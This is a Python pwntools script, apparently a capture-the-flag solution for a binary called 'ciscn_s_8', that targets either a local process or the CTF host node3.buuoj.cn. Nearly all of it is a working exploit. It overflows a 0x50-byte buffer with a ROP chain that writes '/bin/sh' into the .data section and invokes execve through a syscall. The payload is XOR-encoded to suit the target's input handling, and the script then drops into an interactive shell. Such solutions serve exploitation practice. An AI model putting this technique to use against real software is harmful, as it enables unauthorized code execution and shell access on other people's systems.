import sys
from pwn import *
from struct import pack
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ciscn_s_8')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ciscn_s_8')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',28576)
			elf=ELF('./ciscn_s_8')
			#libc=ELF('./libc.so.6')

		p = 'a'*0x50
		p += pack('<Q', 0x00000000004040fe) # pop rsi ; ret
		p += pack('<Q', 0x00000000006ba0e0) # @ .data
		p += pack('<Q', 0x0000000000449b9c) # pop rax ; ret
		p += '/bin/sh\x00'
		p += pack('<Q', 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret
		p += pack('<Q', 0x00000000004040fe) # pop rsi ; ret
		p += pack('<Q', 0x00000000006ba0e8) # @ .data + 8
		p += pack('<Q', 0x0000000000444f00) # xor rax, rax ; ret
		p += pack('<Q', 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret
		p += pack('<Q', 0x00000000004006e6) # pop rdi ; ret
		p += pack('<Q', 0x00000000006ba0e0) # @ .data
		p += pack('<Q', 0x00000000004040fe) # pop rsi ; ret
		p += pack('<Q', 0x00000000006ba0e8) # @ .data + 8
		p += pack('<Q', 0x0000000000449bf5) # pop rdx ; ret
		p += pack('<Q', 0x00000000006ba0e8) # @ .data + 8
		p += pack('<Q', 0x0000000000444f00) # xor rax, rax ; ret
		p += p64(0x0000000000449b9c)
		p += p64(59)
		p += pack('<Q', 0x00000000004751a5) # syscall ; ret

		pay=''
		for i in p :
			pay+=chr(ord(i)^0x66)

		io.recv()
		io.sendline(pay)







		#success('libc_base:'+hex(libc_base))
		#gdb.attach(io)
		#pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue